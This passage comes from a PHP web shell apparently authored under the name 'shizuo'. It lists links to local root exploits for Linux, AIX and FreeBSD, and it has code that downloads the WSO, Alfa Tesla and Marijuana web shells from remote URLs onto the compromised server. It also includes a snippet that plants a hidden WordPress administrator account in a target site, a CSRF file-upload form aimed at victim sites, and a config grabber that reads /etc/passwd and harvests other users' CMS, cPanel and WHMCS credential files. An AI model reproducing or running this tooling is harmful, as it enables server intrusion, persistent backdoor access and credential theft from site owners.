<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2009/CVE-2009-3547' class='text-decoration-none text-light'>CVE-2009-3547 | Linux 2.6.x fs/pipe.c Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2010/CVE-2010-1146' class='text-decoration-none text-light'>CVE-2010-1146 | ReiserFS (Linux Kernel 2.6.34-rc3 / RedHat / Ubuntu 9.10) - 'xattr' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2010/CVE-2010-2959' class='text-decoration-none text-light'>CVE-2010-2959 | Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2010/CVE-2010-3081' class='text-decoration-none text-light'>CVE-2010-3081 | Linux Kernel 2.6.27 < 2.6.36 (RedHat x86-64) - 'compat' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2010/CVE-2010-3301' class='text-decoration-none text-light'>CVE-2010-3301 | Linux Kernel < 2.6.36-rc4-git2 (x86-64) - 'ia32syscall' Emulation Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2010/CVE-2010-3437' class='text-decoration-none text-light'>CVE-2010-3437 | Linux Kernel < 2.6.36-rc6 (RedHat / Ubuntu 10.04) - 'pktcdvd' Kernel Memory Disclosure</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2010/CVE-2010-3904' class='text-decoration-none text-light'>CVE-2010-3904 | Linux Kernel 2.6.36-rc8 - 'RDS Protocol' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2010/CVE-2010-4073' class='text-decoration-none text-light'>CVE-2010-4073 | Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2010/CVE-2010-4258' class='text-decoration-none text-light'>CVE-2010-4258 | Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2010/CVE-2010-4347' class='text-decoration-none text-light'>CVE-2010-4347 | Linux Kernel < 2.6.37-rc2 ACPI custom_method Privilege Escalation
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2011/CVE-2011-1021' class='text-decoration-none text-light'>CVE-2011-1021 | Linux Kernel < 2.6.37-rc2 - 'ACPI custom_method' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2011/CVE-2011-2777' class='text-decoration-none text-light'>CVE-2011-2777 | Acpid 1:</b><br>2.0.10-1ubuntu2 (Ubuntu 11.04/11.10) - Boundary Crossing Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2011/CVE-2011-1485' class='text-decoration-none text-light'>CVE-2011-1485 | pkexec - Race Condition Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2011/EDB-ID-18071' class='text-decoration-none text-light'>EDB-ID-18071 | Calibre E-Book Reader - Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2011/EDB-ID-17391' class='text-decoration-none text-light'>EDB-ID-17391 | Linux Kernel 2.6.28/3.0 (DEC Alpha Linux) - Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2011/EDB-ID-15944' class='text-decoration-none text-light'>EDB-ID-15944 | Linux Kernel < 2.6.34 (Ubuntu 10.10 x86/x64) - 'CAP_SYS_ADMIN' Local Privilege Escalation (2)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2012/CVE-2012-0056' class='text-decoration-none text-light'>CVE-2012-0056 | Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2012/CVE-2012-3524' class='text-decoration-none text-light'>CVE-2012-3524 | libdbus - 'DBUS_SYSTEM_BUS_ADDRESS' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2012/CVE-2012-0809' class='text-decoration-none text-light'>CVE-2012-0809 | sudo 1.8.0 < 1.8.3p1 - Format String</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2013/CVE-2013-0268' class='text-decoration-none text-light'>CVE-2013-0268 | Linux Kernel 3.7.6 (RedHat x86/x64) - 'MSR' Driver Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2013/CVE-2013-1763' class='text-decoration-none text-light'>CVE-2013-1763 | Linux Kernel 3.3 < 3.8 (Ubuntu / Fedora 18) - 'sock_diag_handlers()' Local Privilege Escalation (3)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2013/CVE-2013-1858' class='text-decoration-none text-light'>CVE-2013-1858 | Linux Kernel 'CLONE_NEWUSER|CLONE_FS' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2013/CVE-2013-2094' class='text-decoration-none text-light'>CVE-2013-2094 | Linux Kernel < 3.8.9 (x86-64) - 'perf_swevent_init' Local Privilege Escalation (2)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2014/CVE-2014-0038' class='text-decoration-none text-light'>CVE-2014-0038 | Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2014/CVE-2014-0196' class='text-decoration-none text-light'>CVE-2014-0196 | Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2014/CVE-2014-3153' class='text-decoration-none text-light'>CVE-2014-3153 | Linux Kernel 3.14.5 (CentOS 7 / RHEL) - 'libfutex' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2014/CVE-2014-4014' class='text-decoration-none text-light'>CVE-2014-4014 | Linux Kernel 3.13 - SGID Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2014/CVE-2014-4699' class='text-decoration-none text-light'>CVE-2014-4699 | Linux Kernel < 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2014/CVE-2014-5284' class='text-decoration-none text-light'>CVE-2014-5284 | OSSEC 2.8 - 'hosts.deny' Local Privilege Escalation
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2015/CVE-2015-1328' class='text-decoration-none text-light'>CVE-2015-1328 | Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2015/CVE-2015-7547' class='text-decoration-none text-light'>CVE-2015-7547 | glibc - 'getaddrinfo' Stack Buffer Overflow (PoC)
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2016/CVE-2016-0728' class='text-decoration-none text-light'>CVE-2016-0728 | Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege Escalation (1)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2016/CVE-2016-2384' class='text-decoration-none text-light'>CVE-2016-2384 | Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22) - Double-free usb-midi SMEP Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2016/CVE-2016-5195' class='text-decoration-none text-light'>CVE-2016-5195 | Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2016/CVE-2016-8655' class='text-decoration-none text-light'>CVE-2016-8655 | Linux 4.4.0 < 4.4.0-53 - 'AF_PACKET chocobo_root' Local Privilege Escalation (Metasploit)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2016/CVE-2016-9793' class='text-decoration-none text-light'>CVE-2016-9793 | Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2017/CVE-2017-5123' class='text-decoration-none text-light'>CVE-2017-5123 | Linux Kernel 4.14.0-rc4+ - 'waitid()' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2017/CVE-2017-6074' class='text-decoration-none text-light'>CVE-2017-6074 | Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2017/CVE-2017-7308' class='text-decoration-none text-light'>CVE-2017-7308 | Linux Kernel 4.8.0-41-generic (Ubuntu) - Packet Socket Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2017/CVE-2017-7494' class='text-decoration-none text-light'>CVE-2017-7494 | Samba 3.5.0 - Remote Code Execution</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2017/CVE-2017-7533' class='text-decoration-none text-light'>CVE-2017-7533 | Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2017/CVE-2017-16939' class='text-decoration-none text-light'>CVE-2017-16939 | Linux Kernel (Ubuntu 17.04) - 'XFRM' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2017/CVE-2017-16995' class='text-decoration-none text-light'>CVE-2017-16995 | Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2017/CVE-2017-1000112' class='text-decoration-none text-light'>CVE-2017-1000112 | Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2017/CVE-2017-1000367' class='text-decoration-none text-light'>CVE-2017-1000367 | Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2018/CVE-2018-1000001' class='text-decoration-none text-light'>CVE-2018-1000001 | glibc < 2.26 - 'getcwd()' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2019/CVE-2019-7304' class='text-decoration-none text-light'>CVE-2019-7304 | snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (1)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/2019/CVE-2019-13272' class='text-decoration-none text-light'>CVE-2019-13272 | Linux Kernel 4.10 < 5.1.17 - 'PTRACE_TRACEME' pkexec Local Privilege Escalation</a><br>
<b>IBM AIX</b><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/IBM%20AIX' class='text-decoration-none text-light'>CVE-2013-4011 - IBM AIX 6.1 / 7.1 Localroot Privilege Escalation</a><br>
<b>FreeBSD</b><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2005/EDB-ID-1311' class='text-decoration-none text-light'>EDB-ID-1311 | FreeBSD 4.x / < 5.4 - 'master.passwd' Disclosure</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2008/CVE-2008-3531' class='text-decoration-none text-light'>CVE-2008-3531 | FreeBSD 7.0/7.1 - 'vfs.usermount' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2008/CVE-2008-5736' class='text-decoration-none text-light'>CVE-2008-5736 | FreeBSD 6.4 - Netgraph Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2009/CVE-2009-3527' class='text-decoration-none text-light'>CVE-2009-3527 | FreeBSD 6.4 - 'pipeclose()'/'knlist_cleardel()' Race Condition</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2009/CVE-2009-4146' class='text-decoration-none text-light'>CVE-2009-4146 | FreeBSD 8.0 Run-Time Link-Editor (RTLD) - Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2009/EDB-ID-9860' class='text-decoration-none text-light'>EDB-ID-9860 | FreeBSD 7.2 - VFS/devfs Race Condition</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2010/CVE-2010-2020' class='text-decoration-none text-light'>CVE-2010-2020 | FreeBSD 8.0/7.3/7.2 - 'nfs_mount()' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2010/CVE-2010-2693' class='text-decoration-none text-light'>CVE-2010-2693 | FreeBSD - 'mbufs()' sendfile Cache Poisoning Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2010/CVE-2010-4210' class='text-decoration-none text-light'>CVE-2010-4210 | FreeBSD - 'pseudofs' Null Pointer Dereference Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2011/CVE-2011-4062' class='text-decoration-none text-light'>CVE-2011-4062 | FreeBSD - UIPC socket heap Overflow (PoC)</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2011/CVE-2011-4122' class='text-decoration-none text-light'>CVE-2011-4122 | OpenPAM - 'pam_start()' Local Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2011/CVE-2011-4862' class='text-decoration-none text-light'>CVE-2011-4862 | TelnetD encrypt_keyid - Function Pointer Overwrite</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2012/CVE-2012-0217' class='text-decoration-none text-light'>CVE-2012-0217 | FreeBSD 8.3 - 9.0 amd64 Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2012/EDB-ID-28718' class='text-decoration-none text-light'>EDB-ID-28718 | FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation</a><br>
<a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2013/CVE-2013-2171' class='text-decoration-none text-light'>CVE-2013-2171 | FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation</a><br>
					";
				}
		// get tools
		if($_7['id'] == 'getools'){
		ob_implicit_flush();ob_end_flush();s();
		echo '<center class="anu">Get Tools</center>';
		echo "
			<div class='text-center'>
				<div class='btn-group mb-3'>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=wso'><i class='bi bi-peace'></i> Wso Shell </a>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=alfa'><i class='bi bi-peace'></i> Alfa Tesla Shell </a>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=marijuana'><i class='bi bi-peace'></i> Marijuana Shell </a>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=wpadd'><i class='bi bi-peace'></i> WP Add Admin </a>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=shellscan'><i class='bi-peace'></i> Shell Scanner </a>
					<a class='btn btn-outline-light btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=csrf'><i class='bi bi-peace'></i> CSRF </a>
				</div>
			</div>";
		echo "<b><center class=anu>";
		if(isset($_GET['id_two']) && $_GET['id_two'] == "wso") {
			echo "<center class='anu'>Get Wso Shell<br>";
			function wso($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('babiwso.php')) {
		echo "<gr><a style='color:white;text-decoration:none;' href=$full/babiscan.php target='_blank'>Click Here</a></gr></center>";
	} else {
		if(wso("https://raw.githubusercontent.com/BOTKNTL/kontol/master/wso425.php","babiwso.php")) {
			echo "<gr><a style='color:white;text-decoration:none;' href=$full/babiwso.php target='_blank'>Click Here</a></gr></center>";
		} else {
			echo "<rd>Failed to create wso shell</rd>";}
			
		} echo "</center>";
		} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "alfa") {
			echo "<center class='anu'>Get Alfa Shell<br>";
			function alfa($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('babialfa.php')) {
		echo "<gr><a style='color:white;text-decoration:none;' href=$full/babialfa.php target='_blank'>Click Here</a></gr></center>";
	} else {
		if(alfa("https://raw.githubusercontent.com/BOTKNTL/kontol/master/alfatesla.php","babialfa.php")) {
			echo "<gr><a style='color:white;text-decoration:none;' href=$full/babialfa.php target='_blank'>Click Here</a></gr></center>";
		} else {
			echo "<rd>Failed to create alfa shell</rd>";}}
		} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "marijuana") {
			echo "<center class='anu'>Get Marijuana Shell<br>";
			function marijuana($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('babimarijuana.php')) {
		echo "<gr><a style='color:white;text-decoration:none;' href=$full/babimarijuana.php target='_blank'>Click Here</a></gr></center>";
	} else {
		if(marijuana("https://raw.githubusercontent.com/BOTKNTL/kontol/master/maricoli.php","babimarijuana.php")) {
			echo "<gr><a style='color:white;text-decoration:none;' href=$full/babimarijuana.php target='_blank'>Click Here</a></gr></center>";
		} else {
			echo "<rd>Failed to create marijuana shell:(</rd>";}
		} echo "</center>";
	} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "wpadd") {?>
				<div class='container-fluid language-javascript'>
					<div class='shell mb-3'>
						<pre style='font-size:10px;'><code>function shizuoadmin(){
$login = 'shizuo';
$passw = 'shizuo#1337';
$email = 'g00glesec@proton.me';
if ( !username_exists( $login ) && !email_exists( $email ) ) {
$user_id = wp_create_user( $login, $passw, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
}
}
add_action('init','shizuoadmin');</code></pre>
					</div>
					Add the above code in the functions.php file on the target website.<br>
example: https://site.gov/wp-content/themes/[theme name/functions.php
				</div><?php
		} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "csrf") {
			echo "<div class='card card-body text-dark input-group mb-3'>
<form method='POST'> Target:<input class='form-control btn-sm' type='text' name='url' size='50' height='10' placeholder='http://victim.com/[PATH]/upload.php' style='margin: 5px auto; padding-left: 5px;' required>
POST File: <input class='form-control btn-sm' type='text' name='pf' size='50' height='10' placeholder='Filedata, dzupload, dzfile, dzfiles, file, ajaxfup, files[], qqfile, userfile' style='margin: 5px auto; padding-left: 5px;' required>
<input class='btn btn-dark btn-sm' type='submit' name='d' value='Lock!'></form>";
$url = $_POST["url"];
$pf = $_POST["pf"];
$d = $_POST["d"];
if($d) {
echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input class='form-control btn-sm' type='file' name='$pf'>
<input class='btn btn-dark btn-sm' type='submit' name='g' value='Upload!'></form></form></div>";}
} elseif(isset($_GET['id_two']) && $_GET['id_two'] == "shellscan") {
	echo "<center class='anu'>Get Shell Backdoor Detector<br>";
	function babidetect($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('babidetect.php')) {
		echo "<gr><a style='color:white;text-decoration:none;' href=$full/babidetect.php target='_blank'>Click Here</a></gr></center>";
	} else {
		if(babidetect("https://gitlab.com/jasonrondiguez/a/-/raw/main/t0000000ls/shellllllllscaaannnnn.php","babidetect.php")) {
			echo "<gr><a style='color:white;text-decoration:none;' href=$full/babidetect.php target='_blank'>Click Here</a></gr></center>";
		} else {
			echo "<rd>Failed to create shell backdoor detector:(</rd>";}
		} echo "</center>";
	}
		}
		// config grabber
		if($_7['id'] == 'config'){
	echo '<center class="anu"><br>Grab Config by shizuo</center>';
	$etc = fopen("/etc/passwd", "r") or die("<rd>can't read /etc/passwd:(</rd>");
	$idx = mkdir("shizuo_CONFIG", 0777);
	$isi_htc = "Options allnRequire NonenSatisfy Any";
	$htc = fopen("shizuo_CONFIG/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<rd>Can't read /etc/passwd:(</rd>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $shizuo) {
				$user_config_dir = "/home/$shizuo/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$shizuo/.my.cnf" => "cpanel",
						"/home/$shizuo/.accesshash" => "WHM-accesshash",
							"/home/$shizuo/config/koneksi.php" => "Lokomedia",
							"/home/$shizuo/forum/config.php" => "phpBB",
							"/home/$shizuo/sites/default/settings.php" => "Drupal",
							"/home/$shizuo/config/settings.inc.php" => "PrestaShop",
							"/home/$shizuo/app/etc/local.xml" => "Magento",
							"/home/$shizuo/admin/config.php" => "OpenCart",
							"/home/$shizuo/application/config/database.php" => "Ellislab",
							"/home/$shizuo/vb/includes/config.php" => "Vbulletin",
							"/home/$shizuo/includes/config.php" => "Vbulletin",
							"/home/$shizuo/forum/includes/config.php" => "Vbulletin",
							"/home/$shizuo/forums/includes/config.php" => "Vbulletin",
							"/home/$shizuo/cc/includes/config.php" => "Vbulletin",
							"/home/$shizuo/inc/config.php" => "MyBB",
							"/home/$shizuo/includes/configure.php" => "OsCommerce",
							"/home/$shizuo/shop/includes/configure.php" => "OsCommerce",
							"/home/$shizuo/os/includes/configure.php" => "OsCommerce",
							"/home/$shizuo/oscom/includes/configure.php" => "OsCommerce",
							"/home/$shizuo/products/includes/configure.php" => "OsCommerce",
							"/home/$shizuo/cart/includes/configure.php" => "OsCommerce",
							"/home/$shizuo/inc/conf_global.php" => "IPB",
							"/home/$shizuo/wp-config.php" => "Wordpress",
							"/home/$shizuo/wp/test/wp-config.php" => "Wordpress",
							"/home/$shizuo/blog/wp-config.php" => "Wordpress",
							"/home/$shizuo/beta/wp-config.php" => "Wordpress",
							"/home/$shizuo/portal/wp-config.php" => "Wordpress",
							"/home/$shizuo/site/wp-config.php" => "Wordpress",
							"/home/$shizuo/wp/wp-config.php" => "Wordpress",
							"/home/$shizuo/WP/wp-config.php" => "Wordpress",
							"/home/$shizuo/news/wp-config.php" => "Wordpress",
							"/home/$shizuo/wordpress/wp-config.php" => "Wordpress",
							"/home/$shizuo/test/wp-config.php" => "Wordpress",
							"/home/$shizuo/demo/wp-config.php" => "Wordpress",
							"/home/$shizuo/home/wp-config.php" => "Wordpress",
							"/home/$shizuo/v1/wp-config.php" => "Wordpress",
							"/home/$shizuo/v2/wp-config.php" => "Wordpress",
							"/home/$shizuo/press/wp-config.php" => "Wordpress",
							"/home/$shizuo/new/wp-config.php" => "Wordpress",
							"/home/$shizuo/blogs/wp-config.php" => "Wordpress",
							"/home/$shizuo/configuration.php" => "Joomla",
							"/home/$shizuo/blog/configuration.php" => "Joomla",
							"/home/$shizuo/submitticket.php" => "^WHMCS",
							"/home/$shizuo/cms/configuration.php" => "Joomla",
							"/home/$shizuo/beta/configuration.php" => "Joomla",
							"/home/$shizuo/portal/configuration.php" => "Joomla",
							"/home/$shizuo/site/configuration.php" => "Joomla",
							"/home/$shizuo/main/configuration.php" => "Joomla",
							"/home/$shizuo/home/configuration.php" => "Joomla",
							"/home/$shizuo/demo/configuration.php" => "Joomla",
							"/home/$shizuo/test/configuration.php" => "Joomla",
							"/home/$shizuo/v1/configuration.php" => "Joomla",
							"/home/$shizuo/v2/configuration.php" => "Joomla",
							"/home/$shizuo/joomla/configuration.php" => "Joomla",
							"/home/$shizuo/new/configuration.php" => "Joomla",
							"/home/$shizuo/WHMCS/submitticket.php" => "WHMCS",
							"/home/$shizuo/whmcs1/submitticket.php" => "WHMCS",
							"/home/$shizuo/Whmcs/submitticket.php" => "WHMCS",
							"/home/$shizuo/whmcs/submitticket.php" => "WHMCS",
							"/home/$shizuo/whmcs/submitticket.php" => "WHMCS",
							"/home/$shizuo/WHMC/submitticket.php" => "WHMCS",
							"/home/$shizuo/Whmc/submitticket.php" => "WHMCS",
							"/home/$shizuo/whmc/submitticket.php" => "WHMCS",
							"/home/$shizuo/WHM/submitticket.php" => "WHMCS",
							"/home/$shizuo/Whm/submitticket.php" => "WHMCS",
							"/home/$shizuo/whm/submitticket.php" => "WHMCS",
							"/home/$shizuo/HOST/submitticket.php" => "WHMCS",
							"/home/$shizuo/Host/submitticket.php" => "WHMCS",
							"/home/$shizuo/host/submitticket.php" => "WHMCS",
							"/home/$shizuo/SUPPORTES/submitticket.php" => "WHMCS",
							"/home/$shizuo/Supportes/submitticket.php" => "WHMCS",
							"/home/$shizuo/supportes/submitticket.php" => "WHMCS",
							"/home/$shizuo/domains/submitticket.php" => "WHMCS",
							"/home/$shizuo/domain/submitticket.php" => "WHMCS",
							"/home/$shizuo/Hosting/submitticket.php" => "WHMCS",
							"/home/$shizuo/HOSTING/submitticket.php" => "WHMCS",
							"/home/$shizuo/hosting/submitticket.php" => "WHMCS",
							"/home/$shizuo/CART/submitticket.php" => "WHMCS",
							"/home/$shizuo/Cart/submitticket.php" => "WHMCS",
							"/home/$shizuo/cart/submitticket.php" => "WHMCS",
							"/home/$shizuo/ORDER/submitticket.php" => "WHMCS",
							"/home/$shizuo/Order/submitticket.php" => "WHMCS",
							"/home/$shizuo/order/submitticket.php" => "WHMCS",
							"/home/$shizuo/CLIENT/submitticket.php" => "WHMCS",
							"/home/$shizuo/Client/submitticket.php" => "WHMCS",
							"/home/$shizuo/client/submitticket.php" => "WHMCS",
							"/home/$shizuo/CLIENTAREA/submitticket.php" => "WHMCS",
							"/home/$shizuo/Clientarea/submitticket.php" => "WHMCS",
							"/home/$shizuo/clientarea/submitticket.php" => "WHMCS",
							"/home/$shizuo/SUPPORT/submitticket.php" => "WHMCS",
							"/home/$shizuo/Support/submitticket.php" => "WHMCS",
							"/home/$shizuo/support/submitticket.php" => "WHMCS",
							"/home/$shizuo/BILLING/submitticket.php" => "WHMCS",
							"/home/$shizuo/Billing/submitticket.php" => "WHMCS",
							"/home/$shizuo/billing/submitticket.php" => "WHMCS",
							"/home/$shizuo/BUY/submitticket.php" => "WHMCS",
							"/home/$shizuo/Buy/submitticket.php" => "WHMCS",
							"/home/$shizuo/buy/submitticket.php" => "WHMCS",
							"/home/$shizuo/MANAGE/submitticket.php" => "WHMCS",
							"/home/$shizuo/Manage/submitticket.php" => "WHMCS",
